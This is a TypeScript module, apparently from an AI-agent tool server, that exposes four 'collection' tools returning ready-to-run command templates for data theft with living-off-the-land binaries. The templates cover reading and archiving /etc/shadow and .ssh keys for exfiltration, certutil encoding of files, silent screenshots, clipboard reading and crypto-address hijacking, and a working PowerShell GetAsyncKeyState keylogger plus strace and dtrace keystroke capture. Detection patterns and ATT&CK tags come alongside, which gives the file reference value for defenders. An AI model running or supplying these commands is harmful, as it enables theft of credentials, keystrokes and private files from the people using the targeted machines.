import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

// ━━━ Collection Technique Data ━━━

interface CollectionTechnique {
  name: string;
  description: string;
  binary: string;
  commandTemplate: string;
  detectionPatterns: string[];
  stealthScore: number;
  platforms: Platform[];
  attck: string[];
  notes: string;
}

const FILE_READ_TECHNIQUES: CollectionTechnique[] = [
  {
    name: "cat File Read",
    description: "Read file contents using cat (most common Unix file reader)",
    binary: "cat",
    commandTemplate: "cat /etc/shadow",
    detectionPatterns: ["cat accessing sensitive files", "File read audit events", "/etc/shadow access"],
    stealthScore: 1,
    platforms: ["linux", "macos"],
    attck: ["T1005", "T1552.001"],
    notes: "Extremely common; difficult to distinguish from legitimate usage without context.",
  },
  {
    name: "type File Read (Windows)",
    description: "Read file contents using the type command on Windows",
    binary: "cmd.exe",
    commandTemplate: "type C:\\Users\\<USER>\\Desktop\\sensitive.txt",
    detectionPatterns: ["cmd.exe type command", "File access audit events"],
    stealthScore: 1,
    platforms: ["windows"],
    attck: ["T1005"],
    notes: "Built-in Windows command. Low noise.",
  },
  {
    name: "PowerShell Get-Content",
    description: "Read file contents using PowerShell Get-Content cmdlet",
    binary: "powershell.exe",
    commandTemplate: "Get-Content C:\\Users\\<USER>\\Documents\\credentials.txt",
    detectionPatterns: ["PowerShell Get-Content", "Script block logging", "File access via PowerShell"],
    stealthScore: 2,
    platforms: ["windows"],
    attck: ["T1005", "T1059.001"],
    notes: "PowerShell file access is logged via script block logging if enabled.",
  },
  {
    name: "xxd / hexdump Binary Read",
    description: "Read binary files as hex dump for data extraction",
    binary: "xxd",
    commandTemplate: "xxd /path/to/binary/file | head -100",
    detectionPatterns: ["xxd execution", "hexdump execution", "Binary file read"],
    stealthScore: 1,
    platforms: ["linux", "macos"],
    attck: ["T1005"],
    notes: "Useful for reading binary database files, keystores, etc.",
  },
  {
    name: "certutil File Harvest (Windows)",
    description: "Use certutil to encode files for exfiltration (base64 conversion)",
    binary: "certutil.exe",
    commandTemplate: "certutil -encode C:\\Users\\<USER>\\sensitive.docx C:\\Temp\\encoded.b64",
    detectionPatterns: ["certutil -encode", "certutil file operation", "Base64 file creation"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1005", "T1140"],
    notes: "Encodes files to base64 for easier exfiltration via text channels.",
  },
  {
    name: "tar Archive Collection",
    description: "Archive multiple files into a tar for bulk collection",
    binary: "tar",
    commandTemplate: "tar czf /tmp/collected.tar.gz /home/<USER>/.ssh/ /etc/passwd /etc/shadow 2>/dev/null",
    detectionPatterns: ["tar archiving sensitive directories", "Bulk file collection", "Archive creation in /tmp"],
    stealthScore: 2,
    platforms: ["linux", "macos"],
    attck: ["T1560.001", "T1005"],
    notes: "Archives multiple targets for efficient exfiltration.",
  },
  {
    name: "Compress-Archive (PowerShell)",
    description: "Archive files using PowerShell Compress-Archive for bulk collection on Windows",
    binary: "powershell.exe",
    commandTemplate: "Compress-Archive -Path C:\\Users\\<USER>\\Documents\\* -DestinationPath C:\\Temp\\collected.zip",
    detectionPatterns: ["Compress-Archive cmdlet", "ZIP creation via PowerShell", "Script block logging"],
    stealthScore: 2,
    platforms: ["windows"],
    attck: ["T1560.001", "T1005"],
    notes: "Native PowerShell archiving, no third-party tools needed.",
  },
];

const SCREEN_CAPTURE_TECHNIQUES: CollectionTechnique[] = [
  {
    name: "screencapture (macOS)",
    description: "Capture screen using macOS native screencapture command",
    binary: "screencapture",
    commandTemplate: "screencapture -x /tmp/screenshot.png",
    detectionPatterns: ["screencapture execution", "Screen capture API usage", "New image file in /tmp"],
    stealthScore: 2,
    platforms: ["macos"],
    attck: ["T1113"],
    notes: "-x flag suppresses the camera shutter sound. Native macOS tool.",
  },
  {
    name: "Snipping Tool / snippingtool (Windows)",
    description: "Use Windows Snipping Tool for screen capture",
    binary: "snippingtool.exe",
    commandTemplate: "snippingtool.exe /clip",
    detectionPatterns: ["snippingtool.exe execution", "Screen capture via Snipping Tool"],
    stealthScore: 2,
    platforms: ["windows"],
    attck: ["T1113"],
    notes: "Built-in Windows screenshot tool. Requires GUI session.",
  },
  {
    name: "PowerShell Screen Capture",
    description: "Capture screen programmatically using .NET via PowerShell",
    binary: "powershell.exe",
    commandTemplate: "powershell -c \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { $bmp = New-Object Drawing.Bitmap($_.Bounds.Width,$_.Bounds.Height); $g = [Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($_.Bounds.Location,[Drawing.Point]::Empty,$_.Bounds.Size); $bmp.Save('C:\\Temp\\screen.png') }\"",
    detectionPatterns: ["PowerShell System.Windows.Forms", "CopyFromScreen API call", "Script block logging", "Drawing.Bitmap creation"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1113", "T1059.001"],
    notes: "Programmatic screen capture without launching visible tool.",
  },
  {
    name: "xwd / xdpyinfo (X11 Capture)",
    description: "Capture X11 display on Linux using xwd (X Window Dump)",
    binary: "xwd",
    commandTemplate: "xwd -root -out /tmp/screenshot.xwd && convert /tmp/screenshot.xwd /tmp/screenshot.png",
    detectionPatterns: ["xwd execution", "X11 screen capture", "xdpyinfo usage"],
    stealthScore: 2,
    platforms: ["linux"],
    attck: ["T1113"],
    notes: "Requires X11 display access. Convert via ImageMagick for portable format.",
  },
  {
    name: "import (ImageMagick Capture)",
    description: "Capture screen using ImageMagick import command on Linux",
    binary: "import",
    commandTemplate: "import -window root /tmp/screenshot.png",
    detectionPatterns: ["import command execution", "ImageMagick screen capture"],
    stealthScore: 2,
    platforms: ["linux"],
    attck: ["T1113"],
    notes: "Requires ImageMagick and X11 display. Captures entire root window.",
  },
];

const CLIPBOARD_TECHNIQUES: CollectionTechnique[] = [
  {
    name: "pbpaste (macOS Clipboard)",
    description: "Read clipboard contents on macOS using pbpaste",
    binary: "pbpaste",
    commandTemplate: "pbpaste > /tmp/clipboard.txt",
    detectionPatterns: ["pbpaste execution", "Clipboard access on macOS", "Repeated clipboard reads"],
    stealthScore: 1,
    platforms: ["macos"],
    attck: ["T1115"],
    notes: "Native macOS clipboard reader. Can be looped for continuous monitoring.",
  },
  {
    name: "xclip / xsel (Linux Clipboard)",
    description: "Read X11 clipboard contents on Linux",
    binary: "xclip",
    commandTemplate: "xclip -selection clipboard -o > /tmp/clipboard.txt",
    detectionPatterns: ["xclip execution", "xsel execution", "X11 clipboard access"],
    stealthScore: 1,
    platforms: ["linux"],
    attck: ["T1115"],
    notes: "Requires X11. xclip or xsel must be installed.",
  },
  {
    name: "PowerShell Get-Clipboard",
    description: "Read Windows clipboard contents using PowerShell",
    binary: "powershell.exe",
    commandTemplate: "powershell -c \"Get-Clipboard\" > C:\\Temp\\clipboard.txt",
    detectionPatterns: ["Get-Clipboard cmdlet", "PowerShell clipboard access", "Script block logging"],
    stealthScore: 2,
    platforms: ["windows"],
    attck: ["T1115", "T1059.001"],
    notes: "Native PowerShell cmdlet. Available in PowerShell 5.1+.",
  },
  {
    name: "clip.exe (Windows Clipboard Write)",
    description: "Write data to Windows clipboard (can be used for clipboard hijacking)",
    binary: "clip.exe",
    commandTemplate: "echo <MALICIOUS_CONTENT> | clip",
    detectionPatterns: ["clip.exe execution", "Clipboard write via clip", "Pipe to clip.exe"],
    stealthScore: 2,
    platforms: ["windows"],
    attck: ["T1115"],
    notes: "Clipboard write for hijacking scenarios (e.g., replacing crypto addresses).",
  },
];

const INPUT_CAPTURE_TECHNIQUES: CollectionTechnique[] = [
  {
    name: "script Terminal Recording",
    description: "Record terminal session using the script command (captures all input/output)",
    binary: "script",
    commandTemplate: "script -q /tmp/terminal_log.txt",
    detectionPatterns: ["script command execution", "Terminal recording", "PTY allocation"],
    stealthScore: 2,
    platforms: ["linux", "macos"],
    attck: ["T1056.001"],
    notes: "Records everything typed and displayed in the terminal. Use -q for quiet mode.",
  },
  {
    name: "strace Keylog (Linux)",
    description: "Use strace to capture keystrokes by tracing read syscalls on terminal devices",
    binary: "strace",
    commandTemplate: "strace -e trace=read -p <PID_OF_SHELL> -o /tmp/keylog.txt",
    detectionPatterns: ["strace execution", "ptrace system call", "Process tracing", "strace on shell PID"],
    stealthScore: 3,
    platforms: ["linux"],
    attck: ["T1056.001"],
    notes: "Requires same UID or root. Captures raw read syscalls from traced process.",
  },
  {
    name: "PowerShell Keylogger",
    description: "Capture keystrokes using PowerShell and .NET GetAsyncKeyState API",
    binary: "powershell.exe",
    commandTemplate: "powershell -c \"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class KL{[DllImport(\\\"user32.dll\\\")]public static extern int GetAsyncKeyState(int vKey);}'; while($true){Start-Sleep -Milliseconds 40; for($i=8;$i -le 190;$i++){if([KL]::GetAsyncKeyState($i) -eq -32767){[char]$i | Out-File -Append C:\\Temp\\keys.txt}}}\"",
    detectionPatterns: ["GetAsyncKeyState API", "PowerShell Add-Type with DllImport", "Continuous keyboard polling", "Script block logging", "AMSI detection"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1056.001", "T1059.001"],
    notes: "Pure PowerShell keylogger using Win32 API. Highly detectable by AMSI and EDR.",
  },
  {
    name: "xinput / xdotool (X11 Input)",
    description: "Capture X11 input events using xinput or xdotool on Linux",
    binary: "xinput",
    commandTemplate: "xinput list && xinput test <KEYBOARD_ID>",
    detectionPatterns: ["xinput execution", "X11 input event monitoring", "xinput test command"],
    stealthScore: 3,
    platforms: ["linux"],
    attck: ["T1056.001"],
    notes: "Captures X11 keyboard events. Requires X11 display access.",
  },
  {
    name: "dtrace (macOS Input Capture)",
    description: "Use DTrace to capture keyboard input on macOS (requires SIP disabled or entitlement)",
    binary: "dtrace",
    commandTemplate: "dtrace -n 'syscall::read:entry /execname == \"Terminal\"/ { printf(\"%s\", copyin(arg1, arg2)); }'",
    detectionPatterns: ["dtrace execution", "DTrace kernel tracing", "SIP status check"],
    stealthScore: 3,
    platforms: ["macos"],
    attck: ["T1056.001"],
    notes: "Requires System Integrity Protection (SIP) disabled or specific entitlements.",
  },
];

// ━━━ Helper ━━━

function findKBEntries(
  ctx: ToolContext,
  keywords: string[],
  functions: string[],
  platform?: Platform,
): UnifiedLOLEntry[] {
  const results: UnifiedLOLEntry[] = [];
  const seen = new Set<string>();

  for (const func of functions) {
    const entries = ctx.knowledgeBase.searchByFunction(func as any, platform);
    for (const e of entries) {
      if (!seen.has(e.id)) { seen.add(e.id); results.push(e); }
    }
  }

  for (const kw of keywords) {
    const entries = ctx.knowledgeBase.searchByKeyword(kw, platform);
    for (const e of entries) {
      if (!seen.has(e.id)) { seen.add(e.id); results.push(e); }
    }
  }

  return results;
}

function summarizeEntry(e: UnifiedLOLEntry): Record<string, unknown> {
  return {
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealthScore: e.stealthScore,
    commands: e.executionContexts.slice(0, 3).map(c => ({
      context: c.context,
      command: c.command,
      result: c.result,
    })),
    attck: e.attckTechniques,
  };
}

function formatTechnique(t: CollectionTechnique): Record<string, unknown> {
  return {
    name: t.name,
    description: t.description,
    binary: t.binary,
    commandTemplate: t.commandTemplate,
    detectionPatterns: t.detectionPatterns,
    stealthScore: t.stealthScore,
    platforms: t.platforms,
    attck: t.attck,
    notes: t.notes,
  };
}

// ━━━ Tools ━━━

const collect_file_read: ToolDef = {
  name: "collect_file_read",
  description: "File reading/harvesting techniques using LOL binaries (cat, type, certutil encode, tar, etc.)",
  schema: {
    platform: z.enum(["linux", "windows", "macos", "all"]).optional().default("all")
      .describe("Target platform to filter file read techniques"),
    method: z.enum(["read", "encode", "archive", "all"]).optional().default("all")
      .describe("Collection method: direct read, base64 encode, archive, or all"),
  },
  async execute(args: { platform?: string; method?: string }, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform || "all";
    const method = args.method || "all";
    let techniques = [...FILE_READ_TECHNIQUES];

    if (platform !== "all") {
      techniques = techniques.filter(t => t.platforms.includes(platform as Platform));
    }

    if (method !== "all") {
      const methodMap: Record<string, string[]> = {
        read: ["read", "cat", "type", "get-content", "xxd"],
        encode: ["encode", "certutil", "base64"],
        archive: ["archive", "tar", "compress"],
      };
      const keywords = methodMap[method] || [];
      if (keywords.length > 0) {
        techniques = techniques.filter(t =>
          keywords.some(kw =>
            t.name.toLowerCase().includes(kw) ||
            t.description.toLowerCase().includes(kw),
          ),
        );
      }
    }

    // Search KB for file read entries
    const kbEntries = findKBEntries(
      ctx,
      ["cat", "type", "certutil", "tar", "read"],
      ["file_read", "encode_decode"],
      platform !== "all" ? platform as Platform : undefined,
    );

    return json({
      platform,
      method,
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 15).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const collect_screen_capture: ToolDef = {
  name: "collect_screen_capture",
  description: "Screen capture techniques using native tools (screencapture, snippingtool, xwd, PowerShell)",
  schema: {
    platform: z.enum(["linux", "windows", "macos", "all"]).optional().default("all")
      .describe("Target platform to filter screen capture techniques"),
  },
  async execute(args: { platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform || "all";
    let techniques = [...SCREEN_CAPTURE_TECHNIQUES];

    if (platform !== "all") {
      techniques = techniques.filter(t => t.platforms.includes(platform as Platform));
    }

    // Search KB for screen capture related entries
    const kbEntries = findKBEntries(
      ctx,
      ["screencapture", "screenshot", "screen", "capture", "xwd", "import"],
      ["file_write"],
      platform !== "all" ? platform as Platform : undefined,
    );

    return json({
      platform,
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const collect_clipboard: ToolDef = {
  name: "collect_clipboard",
  description: "Clipboard access techniques for reading and hijacking clipboard data (pbpaste, xclip, Get-Clipboard)",
  schema: {
    platform: z.enum(["linux", "windows", "macos", "all"]).optional().default("all")
      .describe("Target platform to filter clipboard techniques"),
    operation: z.enum(["read", "write", "all"]).optional().default("all")
      .describe("Clipboard operation: read (capture), write (hijack), or all"),
  },
  async execute(args: { platform?: string; operation?: string }, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform || "all";
    const operation = args.operation || "all";
    let techniques = [...CLIPBOARD_TECHNIQUES];

    if (platform !== "all") {
      techniques = techniques.filter(t => t.platforms.includes(platform as Platform));
    }

    if (operation !== "all") {
      if (operation === "read") {
        techniques = techniques.filter(t =>
          t.name.toLowerCase().includes("read") ||
          t.name.toLowerCase().includes("paste") ||
          t.name.toLowerCase().includes("get") ||
          t.description.toLowerCase().includes("read"),
        );
      } else if (operation === "write") {
        techniques = techniques.filter(t =>
          t.name.toLowerCase().includes("write") ||
          t.name.toLowerCase().includes("clip.exe") ||
          t.description.toLowerCase().includes("hijack"),
        );
      }
    }

    // Search KB for clipboard-related entries
    const kbEntries = findKBEntries(
      ctx,
      ["clipboard", "pbpaste", "pbcopy", "xclip", "clip"],
      ["file_read"],
      platform !== "all" ? platform as Platform : undefined,
    );

    return json({
      platform,
      operation,
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const collect_input_capture: ToolDef = {
  name: "collect_input_capture",
  description: "Input capture techniques including keylogging via LOL binaries (script, strace, xinput, dtrace)",
  schema: {
    platform: z.enum(["linux", "windows", "macos", "all"]).optional().default("all")
      .describe("Target platform to filter input capture techniques"),
    method: z.enum(["terminal", "syscall", "api", "x11", "all"]).optional().default("all")
      .describe("Capture method: terminal recording, syscall tracing, API hooking, X11 events, or all"),
  },
  async execute(args: { platform?: string; method?: string }, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform || "all";
    const method = args.method || "all";
    let techniques = [...INPUT_CAPTURE_TECHNIQUES];

    if (platform !== "all") {
      techniques = techniques.filter(t => t.platforms.includes(platform as Platform));
    }

    if (method !== "all") {
      const methodMap: Record<string, string[]> = {
        terminal: ["script", "terminal"],
        syscall: ["strace", "dtrace", "syscall", "trace"],
        api: ["getasynckeystate", "powershell", "api"],
        x11: ["xinput", "xdotool", "x11"],
      };
      const keywords = methodMap[method] || [];
      if (keywords.length > 0) {
        techniques = techniques.filter(t =>
          keywords.some(kw =>
            t.name.toLowerCase().includes(kw) ||
            t.description.toLowerCase().includes(kw) ||
            t.binary.toLowerCase().includes(kw),
          ),
        );
      }
    }

    // Search KB for input capture related entries
    const kbEntries = findKBEntries(
      ctx,
      ["strace", "dtrace", "script", "xinput", "keylog"],
      ["credential_access"],
      platform !== "all" ? platform as Platform : undefined,
    );

    return json({
      platform,
      method,
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

export const collectionTools: ToolDef[] = [
  collect_file_read,
  collect_screen_capture,
  collect_clipboard,
  collect_input_capture,
];
